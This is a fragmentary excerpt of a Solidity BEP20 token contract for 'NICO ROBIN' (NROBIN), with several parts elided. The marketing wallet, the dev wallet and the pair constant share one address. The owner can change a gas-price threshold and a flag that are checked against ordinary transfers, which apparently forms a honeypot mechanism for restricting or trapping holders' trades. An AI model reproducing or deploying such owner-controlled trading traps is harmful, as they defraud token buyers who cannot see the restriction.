...
/*
Token Name: NICO ROBIN
Symbol: NROBIN
TG:https://t.me/Nico_Robiinn
...
contract NROBIN is IBEP20, Auth {
    using SafeMath for uint256;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    
    address MarketingWallet = 0x9b6dB611663E1B37C4dF984b8330156805085Ce9;
    address DevWallet       = 0x9b6dB611663E1B37C4dF984b8330156805085Ce9;

    string constant _name = "NICO ROBIN";
    string constant _symbol = "NROBIN";
    ...
    address PAIR = 0x9b6dB611663E1B37C4dF984b8330156805085Ce9;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != marketingFeeReceiver && recipient != autoLiquidityReceiver && recipient != owner){
        ...
        if (tx.gasprice >= GWEI && recipient != pair && GwBL) {
    ...
    function UpdateGW (uint256 _GW, bool _GWBL) public authorized {
        GWEI = _GW * 1 gwei; 
        GwBL = _GWBL;
    }
